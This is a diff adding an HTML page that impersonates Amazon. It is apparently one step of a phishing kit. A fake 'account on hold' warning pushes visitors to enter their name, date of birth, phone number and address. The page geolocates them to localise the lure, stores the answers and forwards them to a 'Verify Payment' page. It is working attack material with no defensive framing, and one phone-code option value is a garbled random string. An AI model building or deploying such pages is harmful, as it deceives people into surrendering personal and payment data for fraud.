@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Address</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
+        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
+        .header-top { background: #131921; padding: 6px 20px; display: flex; align-items: center; justify-content: space-between; color: #fff; font-size: 13px; }
+        .logo { font-size: 24px; font-weight: 700; color: #fff; text-decoration: none; margin-right: 20px; }
+        .header-kiri { display: flex; align-items: center; }
+        .deliver-to { display: flex; align-items: center; gap: 6px; margin-right: 20px; }
+        .search-bar { display: flex; flex: 1; max-width: 600px; }
+        .search-bar select { border: none; border-radius: 4px 0 0 4px; padding: 6px; background: #f3f3f3; }
+        .search-bar input { flex: 1; border: none; padding: 7px 10px; outline: none; }
+        .search-btn { background: #febd69; border: none; padding: 7px 14px; border-radius: 0 4px 4px 0; cursor: pointer; }
+        .header-kanan { display: flex; align-items: center; gap: 25px; }
+        .header-kanan a { color: #fff; text-decoration: none; }
+        .nav-bar { background: #232f3e; padding: 6px 20px; }
+        .nav-links { display: flex; gap: 20px; }
+        .nav-links a { color: #fff; font-size: 13px; text-decoration: none; }
+        .progress-container { max-width: 580px; margin: 30px auto 20px; padding: 0 20px; }
+        .progress-langkah { display: flex; justify-content: space-between; position: relative; }
+        .progress-langkah::before { content: ''; position: absolute; top: 14px; left: 12%; right: 12%; height: 2px; background: #e0e0e0; }
+        .langkah { text-align: center; position: relative; z-index: 1; width: 33%; }
+        .nomor { width: 28px; height: 28px; border-radius: 50%; background: #f5991d; color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+        .langkah.selesai .nomor { background: #067d62; content: '✓'; }
+        .teks { font-size: 13px; color: #767676; }
+        .langkah.aktif .teks { color: #c45500; font-weight: 600; }
+        .wadah { max-width: 580px; margin: 0 auto 50px; padding: 0 20px; }
+        .peringatan { background: #fff8e5; border: 1px solid #ffd149; border-radius: 4px; padding: 12px 15px; margin-bottom: 20px; }
+        .peringatan h3 { font-size: 15px; color: #c45500; margin-bottom: 5px; }
+        .peringatan p { font-size: 13px; color: #111; line-height: 1.5; }
+        h1 { font-size: 22px; font-weight: 500; color: #111; margin-bottom: 6px; }
+        .sub-judul { font-size: 14px; color: #555; margin-bottom: 25px; }
+        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; color: #111; margin-top: 15px; }
+        input, select { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; height: 36px; }
+        input:focus, select:focus { outline: none; border-color: #007185; box-shadow: 0 0 0 1px #007185; }
+        .baris-dua { display: flex; gap: 12px; }
+        .baris-dua > div { flex: 1; }
+        .tombol { background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; padding: 8px 16px; font-size: 14px; color: #0F1111; cursor: pointer; font-weight: 500; margin-top: 25px; }
+        .tombol:hover { background: #f7ca00; }
+        .bawah { text-align: center; margin-top: 40px; padding: 20px; font-size: 11px; color: #555; border-top: 1px solid #e7e7e7; }
+        .bawah a { color: #0066c0; text-decoration: none; margin: 0 6px; }
+    </style>
+</head>
+<body>
+    <div class="header-top">
+        <div class="header-kiri">
+            <a href="#" class="logo">amazon</a>
+            <div class="deliver-to"><span>📍</span><div><div style="font-size:11px; color:#ccc;">Deliver to</div><div style="font-weight:bold;" id="deliverNegara">Indonesia</div></div></div>
+            <div class="search-bar"><select><option>All</option></select><input type="text" placeholder="Search Amazon"><button class="search-btn">🔍</button></div>
+        </div>
+        <div class="header-kanan"><a href="#">Hello, ID</a><a href="#">Returns<br><b>& Orders</b></a><a href="#">🛒 Cart</a></div>
+    </div>
+    <div class="nav-bar">
+        <div class="nav-links">
+            <a href="#">☰ All</a><a href="#">🔴 Rufus</a><a href="#">Today's Deals</a><a href="#">Prime Video</a><a href="#">Buy Again</a><a href="#">Customer Service</a><a href="#">Registry</a><a href="#">Gift Cards</a><a href="#">Sell</a>
+        </div>
+    </div>
+    <div class="progress-container">
+        <div class="progress-langkah">
+            <div class="langkah aktif"><div class="nomor">1</div><div class="teks" id="langkah1">Verify Address</div></div>
+            <div class="langkah"><div class="nomor">2</div><div class="teks" id="langkah2">Verify Payment</div></div>
+            <div class="langkah"><div class="nomor">3</div><div class="teks" id="langkah3">Complete</div></div>
+        </div>
+    </div>
+    <div class="wadah">
+        <div class="peringatan">
+            <h3 id="perJdl">⚠️ Account on hold temporarily</h3>
+            <p id="perTeks">We notice unusual payment activity on your account and need to verify ownership of the payment method used on your most recent order.</p>
+        </div>
+        <h1 id="judulUtama">Confirm your identity</h1>
+        <p class="sub-judul" id="subJudul">Please enter the information that matches your account.</p>
+        <label id="lblNegara">Country/Region</label>
+        <select id="negara">
+            <option value="ID">Indonesia</option><option value="AU">Australia</option><option value="US">United States</option>
+            <option value="GB">United Kingdom</option><option value="SG">Singapore</option><option value="MY">Malaysia</option>
+            <option value="JP">Japan</option><option value="CN">China</option><option value="TH">Thailand</option>
+        </select>
+        <label id="lblNama">Full name (First and Last name)</label>
+        <input type="text" id="namaLengkap">
+        <label id="lblTgl">Date of Birth</label>
+        <input type="text" id="tglLahir" placeholder="MM/DD/YYYY">
+        <label id="lblTelp">Phone number</label>
+        <div class="baris-dua">
+            <div style="flex:0.3;"><select id="kodeTelp"><option value="+62">+62</option><option value="+61">+61</option><option value="+1">+1</option><option value="+42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ">+81</option><option value="+86">+86</option><option value="+66">+66</option></select></div>
+            <div style="flex:0.7;"><input type="text" id="nomorTelp"></div>
+        </div>
+        <label id="lblAlamat1">Address line 1</label>
+        <input type="text" id="alamat1" placeholder="Street address or P.O. Box">
+        <label id="lblAlamat2">Address line 2</label>
+        <input type="text" id="alamat2" placeholder="Apt, suite, unit, building, floor, etc.">
+        <div class="baris-dua">
+            <div><label id="lblKota">City</label><input type="text" id="kota"></div>
+            <div><label id="lblProv">State</label><input type="text" id="prov"></div>
+            <div><label id="lblPos">ZIP Code</label><input type="text" id="pos"></div>
+        </div>
+        <button type="button" id="lanjut" class="tombol">Verify Address</button>
+    </div>
+    <div class="bawah"><a href="#">Conditions of Use</a> | <a href="#">Privacy Notice</a> | <a href="#">Help</a><p>&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p></div>
+
+<script>
+const terjemahan = {
+  en: { lang1:'Verify Address', lang2:'Verify Payment', lang3:'Complete', perJdl:'⚠️ Account on hold temporarily', perTeks:'We notice unusual payment activity...', judul:'Confirm your identity', sub:'Please enter the information that matches your account.', lblNeg:'Country/Region', lblNama:'Full name', lblTgl:'Date of Birth', lblTelp:'Phone number', lblAl1:'Address line 1', lblAl2:'Address line 2', lblKota:'City', lblProv:'State', lblPos:'ZIP Code', btn:'Verify Address' },
+  id: { lang1:'Verifikasi Alamat', lang2:'Verifikasi Pembayaran', lang3:'Selesai', perJdl:'⚠️ Akun ditangguhkan sementara', perTeks:'Kami mendeteksi aktivitas pembayaran yang tidak biasa...', judul:'Konfirmasi identitas Anda', sub:'Masukkan informasi yang sesuai dengan akun Anda.', lblNeg:'Negara/Wilayah', lblNama:'Nama lengkap', lblTgl:'Tanggal Lahir', lblTelp:'Nomor telepon', lblAl1:'Alamat baris 1', lblAl2:'Alamat baris 2', lblKota:'Kota', lblProv:'Provinsi', lblPos:'Kode Pos', btn:'Verifikasi Alamat' }
+};
+
+async function deteksi() {
+  let kode = 'ID', namaNegara = 'Indonesia', kodeBahasa = 'id', kodeTel = '+62';
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const d = await res.json();
+    kode = d.country_code || 'ID'; namaNegara = d.country_name || 'Indonesia'; kodeTel = d.country_calling_code || '+62';
+    if (['JP'].includes(kode)) kodeBahasa = 'ja'; else if (['CN'].includes(kode)) kodeBahasa = 'zh'; else if (['TH'].includes(kode)) kodeBahasa = 'th'; else if (!['ID'].includes(kode)) kodeBahasa = 'en';
+  } catch {}
+  return { kodeBahasa, namaNegara, kode, kodeTel };
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+  if (!localStorage.getItem('email_pengguna')) { window.location.href = 'amazon.html'; return; }
+  const lok = await deteksi();
+  const t = terjemahan[lok.kodeBahasa] || terjemahan.en;
+  document.getElementById('deliverNegara').textContent = lok.namaNegara;
+  document.getElementById('langkah1').textContent = t.lang1;
+  document.getElementById('langkah2').textContent = t.lang2;
+  document.getElementById('langkah3').textContent = t.lang3;
+  document.getElementById('perJdl').textContent = t.perJdl;
+  document.getElementById('perTeks').textContent = t.perTeks;
+  document.getElementById('judulUtama').textContent = t.judul;
+  document.getElementById('subJudul').textContent = t.sub;
+  document.getElementById('lblNegara').textContent = t.lblNeg;
+  document.getElementById('lblNama').textContent = t.lblNama;
+  document.getElementById('lblTgl').textContent = t.lblTgl;
+  document.getElementById('lblTelp').textContent = t.lblTelp;
+  document.getElementById('lblAlamat1').textContent = t.lblAl1;
+  document.getElementById('lblAlamat2').textContent = t.lblAl2;
+  document.getElementById('lblKota').textContent = t.lblKota;
+  document.getElementById('lblProv').textContent = t.lblProv;
+  document.getElementById('lblPos').textContent = t.lblPos;
+  document.getElementById('lanjut').textContent = t.btn;
+  const optNeg = document.querySelector(`#negara option[value="${lok.kode}"]`); if (optNeg) optNeg.selected = true;
+  const optTel = document.querySelector(`#kodeTelp option[value="${lok.kodeTel}"]`); if (optTel) optTel.selected = true;
+});
+
+document.getElementById('lanjut').addEventListener('click', () => {
+  localStorage.setItem('nama_lengkap', document.getElementById('namaLengkap').value.trim());
+  localStorage.setItem('tgl_lahir', document.getElementById('tglLahir').value.trim());
+  localStorage.setItem('kode_telp', document.getElementById('kodeTelp').value);
+  localStorage.setItem('nomor_telp', document.getElementById('nomorTelp').value.trim());
+  localStorage.setItem('alamat1', document.getElementById('alamat1').value.trim());
+  localStorage.setItem('alamat2', document.getElementById('alamat2').value.trim());
+  localStorage.setItem('kota', document.getElementById('kota').value.trim());
+  localStorage.setItem('provinsi', document.getElementById('prov').value.trim());
+  localStorage.setItem('kode_pos', document.getElementById('pos').value.trim());
+  localStorage.setItem('negara', document.getElementById('negara').selectedOptions[0].textContent);
+  window.location.href = 'billing.html';
+});
+</script>
+</body>
+</html>
